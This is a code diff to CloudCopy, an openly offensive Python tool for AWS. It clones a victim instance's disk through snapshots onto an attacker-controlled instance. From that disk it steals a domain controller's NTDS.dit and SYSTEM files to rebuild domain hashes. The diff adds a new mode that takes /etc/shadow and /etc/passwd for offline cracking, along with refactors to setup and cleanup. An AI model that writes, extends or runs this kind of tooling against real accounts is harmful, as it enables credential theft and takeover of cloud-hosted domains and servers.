@@ -2,7 +2,15 @@ import cmd
 import glob
 import os
 import re
-import readline
+try:
+    import readline
+    # readline is weird on some systems
+    if 'libedit' in readline.__doc__:
+        readline.parse_and_bind("bind ^I rl_complete")
+    else:
+        readline.parse_and_bind("tab: complete")
+except (ImportError, TypeError):
+    import pyreadline as readline
 
 from CloudCopyUtils import CloudCopyUtils
 from botocore.exceptions import ClientError
@@ -13,12 +21,6 @@ REGIONS = ['us-east-2', 'us-east-1', 'us-west-1', 'us-west-2', 'ap-east-1',
            'ap-northeast-1', 'ca-central-1', 'cn-north-1', 'cn-northwest-1',
            'eu-central-1', 'eu-west-1', 'eu-west-2', 'eu-west-3', 'eu-north-1',
            'sa-east-1', 'us-gov-east-1', 'us-gov-west-1']
-
-# readline is weird on some systems
-if 'libedit' in readline.__doc__:
-    readline.parse_and_bind("bind ^I rl_complete")
-else:
-    readline.parse_and_bind("tab: complete")
 
 
 '''
@@ -114,14 +116,13 @@ class BaseCmdInterpreter(cmd.Cmd):
             else:
                 print(option + " = " + self.options[option])
 
+
 '''
 Generic CloudCopy class that the two access types extend off of
 Both access methods use the same path to steal DC hashes what
 changes is how you authenticate to AWS. Subclasses implement the
 stealDHashes method to perform the authentication 
 '''
-
-
 class BaseCloudCopy(BaseCmdInterpreter):
 
     def __init__(self, parentOptions):
@@ -130,20 +131,41 @@ class BaseCloudCopy(BaseCmdInterpreter):
         self.options = parentOptions
         self.options['region'] = ''  # AWS region for accessing the victim instance
 
-    # abstract method subclasses implement to authenticate to AWS
-    def _stealDCHashes(self, type):
+    # runs the cleanup function manually so users have control of when the instance dies
+    def do_cleanup(self, args):
+        if self.cloudCopier:
+            self.cloudCopier.cleanup()
+        else:
+            print("Nothing to cleanup")
+
+    def initCloudCopy(self):
         if '' not in [value for key, value in self.options.items()]:
-            self.cloudCopier = CloudCopyUtils({'type': type, 'options': self.options})
+            self.cloudCopier = CloudCopyUtils({
+                'type': 'profile' if self.__class__.__name__ == 'ProfileCloudCopy' else 'manual',
+                'options': self.options
+            })
             try:
-                self.cloudCopier.createEc2Resource()
+                self.cloudCopier.createBotoClient()
+                self.cloneNewInstance()
+                return True
             except ClientError:
                 print("Error getting boto3 client to AWS")
-            self.stealNewInstance()
+                return False
         else:
             print("Your forgot to set some properties. Make sure that no properties in 'show_options' is set to '' ")
+            return False
+
+    def do_stealShadowPasswd(self, args):
+        if self.initCloudCopy():
+            self.cloudCopier.stealShadowPasswd()
+
+    # steals SYSTEM and NTDS.dit file
+    def do_stealDCHashes(self, args):
+        if self.initCloudCopy():
+            self.cloudCopier.stealDCHashFiles()
 
     # helper for performing the CloudCopy attack from scratch
-    def stealNewInstance(self):
+    def cloneNewInstance(self):
         try:
             if self.cloudCopier.listInstances():
                 self.cloudCopier.printGap()
@@ -157,11 +179,8 @@ class BaseCloudCopy(BaseCmdInterpreter):
                                 self.cloudCopier.printGap()
                                 if self.cloudCopier.createInstance():
                                     self.cloudCopier.printGap()
-                                    self.cloudCopier.grabDCHashFiles()
                             else:
-                                if self.cloudCopier.createInstance():
-                                    self.cloudCopier.printGap()
-                                    self.cloudCopier.grabDCHashFiles()
+                                self.cloudCopier.cleanup()
                     else:
                         print(
                             "The Domain Controller's volume is encrypted meaning we can't share the snapshots created from it"
@@ -182,15 +201,16 @@ class BaseCloudCopy(BaseCmdInterpreter):
                                     self.cloudCopier.printGap()
                                     if self.cloudCopier.createInstance():
                                         self.cloudCopier.printGap()
-                                        self.cloudCopier.grabDCHashFiles()
                         else:
                             print("Sorry they encrypted their drives, better luck next time.")
+                            self.cloudCopier.cleanup()
                 else:
                     print("Snapshot failed being created. This is required for the attack. ")
-                self.cloudCopier.cleanup()
+                    self.cloudCopier.cleanup()
         except KeyboardInterrupt:
             print("User cancelled cloudCopy, cleaning up...")
             self.cloudCopier.cleanup()
+
 
 '''
 BaseCloudCopy sub-class that uses .aws/credentials profiles to authenticate to AWS and perform CloudCopy
@@ -202,12 +222,6 @@ class ProfileCloudCopy(BaseCloudCopy):
         self.prompt = "(Profile CloudCopy)"
         self.options['attackerProfile'] = ''  # name of .aws/credentials profile that pertains to attacker account
         self.options['victimProfile'] = ''  # name of .aws/credentials profile that pertains to victim account
-
-    # implementation of do_stealDCHashes that uses the .aws/credentials profiles to authenticate to AWS
-    def do_stealDCHashes(self, args):
-        """stealDCHashes
-        Initiate the CloudCopy attack to steal the ntds.dit and SYSTEM file to recreate domains hashes"""
-        self._stealDCHashes('profile')
 
 
 '''
@@ -222,12 +236,6 @@ class ManualCloudCopy(BaseCloudCopy):
         self.options['attackerSecretKey'] = ''  # SecretKey to attacker account
         self.options['victimAccessKey'] = ''  # AccessKey to victim account
         self.options['victimSecretKey'] = ''  # SecretKey to attacker account
-
-    # implementation of do_stealDCHashes that uses the user supplied credentials to authenticate to AWS
-    def do_stealDCHashes(self, args):
-        """stealDCHashes
-        Initiate the CloudCopy attack to steal the ntds.dit and SYSTEM file to recreate domains hashes"""
-        self._stealDCHashes('manual')
 
 
 '''
@@ -245,13 +253,16 @@ class MainMenu(BaseCmdInterpreter):
 CLOUDCOPY uses a simple process of V_Instance->Snapshot->Volume->A_Instance 
 to steal the hard drive of a victim instance and mount it to an attacker 
 controlled box for pilfering. CLOUDCOPY has two main modes, Profile and Manual.
+NOTICE: you must manually run "cleanup" to destroy the instances. CLOUDCOPY will only auto-clean when an error occurs
 There are two modes for accessing AWS:
     Profile: Which uses the profiles in .aws/credentials file for authenticating
     Manual:  Which uses supplied Access/Secret keys of the Victim/Attacker for authenticating
 For one attack path:
     StealDCHashes: This mode is meant to run against Domain Controllers in the cloud.
                     It copies the drive to a Linux system, extracts the ntds.dit and SYSTEM
-                    files and uses Impacket's secretsdump to recreate the Domains hashes.""")
+                    files and uses Impacket's secretsdump to recreate the Domains hashes.
+    StealShadowPasswd: This mode is meant to run against Linux servers. It steals the
+                    /etc/shadow and /etc/passwd files for cracking offline.""")
 
     #helper to reset options when switching between attack types
     def reset_options(self):
